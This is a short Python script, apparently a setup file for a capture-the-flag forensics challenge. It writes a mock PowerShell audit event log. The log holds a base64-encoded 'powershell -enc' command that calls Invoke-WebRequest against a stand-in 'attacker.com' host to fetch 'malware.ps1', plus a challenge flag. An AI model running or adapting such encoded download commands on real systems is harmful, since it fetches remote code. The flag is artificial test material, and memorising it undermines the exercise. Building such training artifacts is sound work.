import base64

evtx_path = r"sample_challenges\powershell_audit.evtx"
secret_cmd = 'Invoke-WebRequest -Uri "http://attacker.com/malware.ps1"; $flag = "HackToday26{evtx_powershell_script_block_flag}"'
b64_cmd = base64.b64encode(secret_cmd.encode("utf-16le")).decode()

content = (
    b"ElfFile\x00" + b"\x00" * 500 +
    b"<Event><System><EventID>4104</EventID></System><EventData>powershell.exe -NoProfile -enc " + b64_cmd.encode() + b"</EventData></Event>" +
    b"\x00" * 1000
)

with open(evtx_path, "wb") as f:
    f.write(content)
print("Created powershell_audit.evtx successfully")
